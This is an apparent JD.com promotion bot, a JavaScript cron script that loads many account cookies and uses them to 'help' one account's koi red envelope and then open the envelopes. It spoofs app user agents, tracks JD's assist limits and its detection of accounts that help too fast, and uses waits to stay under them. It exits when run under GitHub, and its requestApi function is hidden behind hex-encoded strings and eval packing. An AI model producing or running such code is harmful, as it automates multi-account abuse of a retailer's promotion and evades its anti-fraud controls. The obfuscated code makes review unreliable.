/*
锦鲤红包互助
入口：[京东App领券频道]
2 4,13,19 * * * jd_lyhb_help.js
仅内部互助
============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
2、新版本的锦鲤红包增加了同账号助力限制,超过2次后就会报火爆，脚本增加了次数检测限制。
*/

const $ = new Env("锦鲤红包互助")
const Ver = '20220401';
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
let helpno = "";
!(async () => {
    await $.wait(1000);
    await VerCheck("lyhb_help",Ver);
    await $.wait(1000);
    requireConfig()
    
    for (let i = 0; i < 1; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        
        let helpNo = await  getBodySign("h5launch");
        if(helpNo===100){
            let data = await requestApi('h5launch');
            //console.log(data)
            if (data?.data?.result?.status == 1){
                console.log(`账号【${$.index}】火爆`)
                break;
            }
           
        }
        
        console.log(`\n账号【${$.index}】${$.UserName} 只助力第1个账号`);
        data = await requestApi1('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
        if (data?.data?.code == 20002) {
            console.log(`账号${$.index},已达拆红包数量限制`)
        }else if (data?.data?.code == 10002) {
            console.log(`账号${$.index},火爆`)
        }else if (data?.data?.code == 20001) {//红包活动正在进行，可拆
            console.log(`互助码: ${data.data.result.redpacketInfo.id}`);
            shareCodes.push(data.data.result.redpacketInfo.id);
        }
        await OpenRedEnvelopes($.index);
        
    }
    await help();
    await $.wait(5000);
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })


async function help(){
    console.log(`\n******开始助力: 内部互助中，******\n`);
    try {//
        for (let i = 0; i <cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        
        if (i>=0){
            let data11 = await getBodySign('jinli_h5assist',shareCodes[0],i,$.UserName1)
            //console.log(data11)

            if (data11===100){
                let result = await requestApi('jinli_h5assist')
                if(result.code === 0 && result.rtn_code === 0){
                   if(result.data.result.status === 0){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n您已助力成功!\n`);
                        await getBodySign('setjinli_h5assist','','',$.UserName1);
                        await $.wait(5000);
                   }else if(result.data.result.status === 4){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号火爆了!\n`);
                        await $.wait(2000);
                   }else if(result.data.result.status === 1){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n不能重复为好友助力哦!\n`);
                        await getBodySign('setjinli_h5assist','','',$.UserName1);
                        await $.wait(2000);
                   }else if(result.data.result.status === 8){
                        console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n抱歉，你不能为自己助力哦!\n`);
                        await $.wait(2000);
                   }
                }else if(result.code === 3){
                    console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n账号助力太快,被系统检测到了,只能等下次再执行了!\n`);
                    await $.wait(5000);
                }
            }else if(data11 === 102){
                console.log(`签名网络错误,请稍后重试！`)
                await $.wait(2000);
            }else if(data11 === 101){
                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n已经助力过,跳过本次助力!\n`);
                await $.wait(1000);
            }else if(data11 === 104){
                console.log(`账号【${$.index}】 助力: ${shareCodes[0]}\n用户信息错误!\n`);
                await $.wait(1000);
            }else{
                console.log(`参数错误！`)
                await $.wait(1000);
            }
        }
    } 
    } catch (e) {
        $.logErr('Error: ', e)
    } finally {
        //resolve("")
    }
}

function requestApi1(functionId,body) {
    return new Promise(resolve => {
        $.post({
            url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${gettimestamp()}&clientVersion=10.3.4&osVersion=-1`,
            headers: {
                "Cookie": cookie,
                "Host":"api.m.jd.com",
                "origin": "https://happy.m.jd.com",
                "referer": "https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html?channel=13&collectionId=545",
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-Requested-With": "com.jingdong.app.mall",
                "User-Agent": "jdapp;iPhone;10.3.2;;;M/5.0;appBuild/167922;jdSupportDarkMode/0;ef/1;ep/%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22ud%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%2C%22sv%22%3A%22CJCkDq%3D%3D%22%2C%22iad%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%7D%2C%22ts%22%3A1648614071%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D;Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;",
            },
            body: body,
        }, (_, resp, data) => {
            try {
                //console.log(data)
                $.data1=data
                data = JSON.parse(data)
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}

async function OpenRedEnvelopes(index){
    console.log(`\n******开始开红包******\n`);
    try {
        //cookie = cookiesArr[i]
        data = await requestApi1('h5activityIndex', "body=%7B%22isjdapp%22%3A1%7D");
        if (data?.data?.code == 20002) {
             console.log(`账号${index},已达拆红包数量限制`)
         }else{
              $.vo2=data.data.result
            for (let vo of  $.vo2.redpacketConfigFillRewardInfo) {
                console.log(`账号1,红包金额🧧🧧🧧：`+vo.operationWord)
                //console.log(vo);
                if(vo.packetStatus===0){
                    console.log("  没有可拆的红包！");
                }else if(vo.packetStatus===1){
                    //发现可拆红包，开始拆了
                    console.log("  发现可拆红包");
                    //cookie = cookiesArr[i]
                    let helpNo = await  getBodySign("h5receiveRedpacketAll");
                    if(helpNo===100){
                        let data = await requestApi('h5receiveRedpacketAll');
                        //console.log(data)
                        if(data.code===0){
                            console.log("  拆到红包金额："+data.data.biz_msg+"-》"+data.data.result.discount);
                        }else{
                            console.log("  拆红包失败");
                        }
                       
                    }
                    
                    /*data = await requestApi1('h5receiveRedpacketAll', hb());
                    if(data.code===0){
                        console.log("  拆到红包金额："+data.data.biz_msg+"-》"+data.data.result.discount);
                    }else{
                        console.log("  拆红包失败");
                    }*/
                    await $.wait(5000);
                }else if(vo.packetStatus===2){
                    //已经拆过红包了
                    console.log("  拆到红包金额："+vo.packetAmount);
                }
            }
         }
    } catch (e) {
       // $.logErr('Error: ', e)
    } finally {
        //resolve()
    }
}


function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}


//hb
eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-3]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('function hb(){return\'body=%7B%22random%0%2%2256828511%0%3%22log%0%2%221647133691611~1QLkKClp2omMDF2UmRnZjAyMQ%1%1.R2RQUFdFYVJQV0RmURkLRxZUC1U0Cw0JGEd%2BUktQWmMaVRhHLBMhCzs3EFBSDxZSFxcpMRYuLxc0VyQnCA%1%1.52dfd4d7~6%2C1~DBC3A45FC9AD7EDA8EEDDC2EC95388E32CCF6965~1vkdld9~C~ThtBVRAPbRRUAxQMCh4MfRp8fmNyeh5UGkISGRtRDh8MDhoJfhV5c2hyehpRGU0XFBBRABsJfRUMch55fWx3YhVUFEYXGhRUAxQMdx4Mfxp8fmN9Dx5UGkISaBUXTFxYFAxrF10AFQQHGnEIGXV5eQsAGlccQRsZGlYCGwACGX4NFH55d3UCGVgZTBAZFFIBGA8GFHUMGnp8dHwAFEcZQhRtGRtSSlwXDAQcF0pGGggXBwAEAgkMDwYHAAQCBQ0MCgAXGhRHUF0XAhBBQkJEQV9AXhAZFEFVVBsPGlRTQkJEQUxUGh4XRlJeFwNuDB4DDgMcDBUECB4EGgNtGRtfUhAPBRoSVkoXAhAMUlIGUQ9WAQQCBlVVV1oEWwtQBFBTBw4MDwsEDlRWDRsZGlxFFAwSXGldV1xQFBoSQRsPCQQBAQcDBg8MCQQEBxoSX1IXAhBXBVcJUVwFXFNQBlQDUFoNXgJXBQ9SB1oEC1EAAwEDDQlQDFFTD1QFFxUXXkJXFAwSQn9YdVdBAQJJcQ9FSW1WRH95VF8Ge3MXGhReQxsPGnNFRlpVFXpaVUJAQlNCGRl8VlEbFBoSW1hDGggXBwAHDAsHGh4XRVVCFwNuDwEDGgIBAWQZGkBaFAxrF1BlUF1bUwcAGQsXFBBceWUSGRsECxwDFBoSBAkbCxwHFBoSBA8CAQAHFBoSVwpUAVZQBlJRUAlXC1dWDlAAVwoMWgBWBwVTAAwCCwoFUwJTUwBXDRAZFFcSaBUXUV1UFAwSU19TXlRTQkISGRtUUhAPFEMSGRtWURAPFEEDGwsbDBAZFFVWak8XAhAFBBQcF1tRGggXRFdeUVZYBQcDDgQIAAgEGh4XW1wSD2ICFAMEGgJtGRtXVF1SFAwSBA8BDwIMAQICAQwECEwEcVJHc3ZGX31afHt0c1RjbQtfV3JxTXd0BQ8bYAR%2BAm9zUFdsfgdiYlVvU1d3Bnl%2BWHB5bXQNXXteVgxzUHAAeGMJdmpYaUpjZGxofkABcn50XWx6XG9kaHENbmNZZ3NsakV9fFxlXnpkS1t0TEFTeVNeUXtCd3V9dncDcktebHwCBVB7QVllZmJTXX10dQp%2BX2BRdH1WE3R0Y2J3fQ1%2FeUp0WHBJBVJ0e3t4e14ITHVtTwJiZ3tnegh7WXtMb315WW9Xc0UICxgCA1wFXVcBD0hHGQhLRkx3SGJyUWFtUGd6cAdhcn5kbWpydGRicGhBfXF3fHliUlF2fkUFYHBIUm9kQGtlcGd1dntSbWVyXnRhY0NeYHdZXnFmZHRtf0pjfnBXBW9zUFljbnNlY31NYXV9UXtyY1Vwa2Zeb3N1dAFjfmdSC0gAAQhZDgtDFBoSWEpSGggXFEs%1~1q344el%0%3%22sceneid%0%2%22JLHBhPageh5%0%7D\'}',[],4,'22|3D|3A|2C'.split('|'),0,{}));

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb8d=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x3F\x61\x70\x70\x69\x64\x3D\x6A\x69\x6E\x6C\x69\x68\x6F\x6E\x67\x62\x61\x6F\x26\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x6C\x6F\x67\x69\x6E\x54\x79\x70\x65\x3D\x32\x26\x63\x6C\x69\x65\x6E\x74\x3D\x6A\x69\x6E\x6C\x69\x68\x6F\x6E\x67\x62\x61\x6F\x26\x74\x3D","\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x30\x2E\x33\x2E\x34\x26\x6F\x73\x56\x65\x72\x73\x69\x6F\x6E\x3D\x2D\x31","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x70\x70\x79\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x70\x70\x79\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x62\x65\x6C\x44\x69\x79\x2F\x7A\x6A\x79\x77\x2F\x33\x75\x67\x65\x64\x46\x61\x37\x79\x41\x36\x4E\x68\x78\x4C\x4E\x35\x67\x77\x32\x4C\x33\x50\x46\x39\x73\x51\x43\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C\x3F\x63\x68\x61\x6E\x6E\x65\x6C\x3D\x31\x33\x26\x63\x6F\x6C\x6C\x65\x63\x74\x69\x6F\x6E\x49\x64\x3D\x35\x34\x35","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x63\x6F\x6D\x2E\x6A\x69\x6E\x67\x64\x6F\x6E\x67\x2E\x61\x70\x70\x2E\x6D\x61\x6C\x6C","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x31\x30\x2E\x33\x2E\x32\x3B\x3B\x3B\x4D\x2F\x35\x2E\x30\x3B\x61\x70\x70\x42\x75\x69\x6C\x64\x2F\x31\x36\x37\x39\x32\x32\x3B\x6A\x64\x53\x75\x70\x70\x6F\x72\x74\x44\x61\x72\x6B\x4D\x6F\x64\x65\x2F\x30\x3B\x65\x66\x2F\x31\x3B\x65\x70\x2F\x25\x37\x42\x25\x32\x32\x63\x69\x70\x68\x65\x72\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x35\x25\x32\x43\x25\x32\x32\x63\x69\x70\x68\x65\x72\x25\x32\x32\x25\x33\x41\x25\x37\x42\x25\x32\x32\x75\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x59\x74\x44\x72\x45\x57\x48\x76\x43\x51\x48\x72\x5A\x4A\x4C\x73\x43\x32\x56\x74\x45\x51\x59\x6D\x59\x74\x43\x35\x59\x74\x54\x74\x43\x4A\x44\x74\x44\x4A\x55\x33\x43\x7A\x71\x6D\x5A\x4A\x48\x74\x5A\x74\x76\x73\x44\x47\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x73\x76\x25\x32\x32\x25\x33\x41\x25\x32\x32\x43\x4A\x43\x6B\x44\x71\x25\x33\x44\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x61\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x48\x55\x55\x6E\x45\x4A\x55\x31\x43\x4A\x47\x6A\x45\x4A\x75\x32\x45\x4D\x30\x30\x44\x4E\x4C\x4E\x42\x55\x4F\x30\x43\x4A\x75\x6A\x43\x55\x54\x4E\x45\x4A\x47\x6E\x47\x30\x50\x4F\x43\x74\x4F\x34\x25\x32\x32\x25\x37\x44\x25\x32\x43\x25\x32\x32\x74\x73\x25\x32\x32\x25\x33\x41\x31\x36\x34\x38\x36\x31\x34\x30\x37\x31\x25\x32\x43\x25\x32\x32\x68\x64\x69\x64\x25\x32\x32\x25\x33\x41\x25\x32\x32\x4A\x4D\x39\x46\x31\x79\x77\x55\x50\x77\x66\x6C\x76\x4D\x49\x70\x59\x50\x6F\x6B\x30\x74\x74\x35\x6B\x39\x6B\x57\x34\x41\x72\x4A\x45\x55\x33\x6C\x66\x4C\x68\x78\x42\x71\x77\x25\x33\x44\x25\x32\x32\x25\x32\x43\x25\x32\x32\x76\x65\x72\x73\x69\x6F\x6E\x25\x32\x32\x25\x33\x41\x25\x32\x32\x31\x2E\x30\x2E\x33\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x70\x70\x6E\x61\x6D\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x63\x6F\x6D\x2E\x33\x36\x30\x62\x75\x79\x2E\x6A\x64\x6D\x6F\x62\x69\x6C\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x69\x64\x78\x25\x32\x32\x25\x33\x41\x2D\x31\x25\x37\x44\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x33\x5F\x36\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31\x3B","\x64\x61\x74\x61\x31","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function requestApi(_0x11dbx2){return  new Promise((_0x11dbx3)=>{$[__Oxdcb8d[0xd]]({url:`${__Oxdcb8d[0x0]}${_0x11dbx2}${__Oxdcb8d[0x1]}${gettimestamp()}${__Oxdcb8d[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x48\x6F\x73\x74":__Oxdcb8d[0x3],"\x6F\x72\x69\x67\x69\x6E":__Oxdcb8d[0x4],"\x72\x65\x66\x65\x72\x65\x72":__Oxdcb8d[0x5],'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':__Oxdcb8d[0x6],"\x58\x2D\x52\x65\x71\x75\x65\x73\x74\x65\x64\x2D\x57\x69\x74\x68":__Oxdcb8d[0x7],"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":__Oxdcb8d[0x8]},body:helpno},(_0x11dbx4,_0x11dbx5,_0x11dbx6)=>{try{$[__Oxdcb8d[0x9]]= _0x11dbx6;_0x11dbx6= JSON[__Oxdcb8d[0xa]](_0x11dbx6)}catch(e){$[__Oxdcb8d[0xc]](__Oxdcb8d[0xb],e,_0x11dbx5)}finally{_0x11dbx3(_0x11dbx6)}})})}(function(_0x11dbx7,_0x11dbx8,_0x11dbx9,_0x11dbxa,_0x11dbxb,_0x11dbxc){_0x11dbxc= __Oxdcb8d[0xe];_0x11dbxa= function(_0x11dbxd){if( typeof alert!== _0x11dbxc){alert(_0x11dbxd)};if( typeof console!== _0x11dbxc){console[__Oxdcb8d[0xf]](_0x11dbxd)}};_0x11dbx9= function(_0x11dbxe,_0x11dbx7){return _0x11dbxe+ _0x11dbx7};_0x11dbxb= _0x11dbx9(__Oxdcb8d[0x10],_0x11dbx9(_0x11dbx9(__Oxdcb8d[0x11],__Oxdcb8d[0x12]),__Oxdcb8d[0x13]));try{_0x11dbx7= __encode;if(!( typeof _0x11dbx7!== _0x11dbxc&& _0x11dbx7=== _0x11dbx9(__Oxdcb8d[0x14],__Oxdcb8d[0x15]))){_0x11dbxa(_0x11dbxb)}}catch(e){_0x11dbxa(_0x11dbxb)}})({})


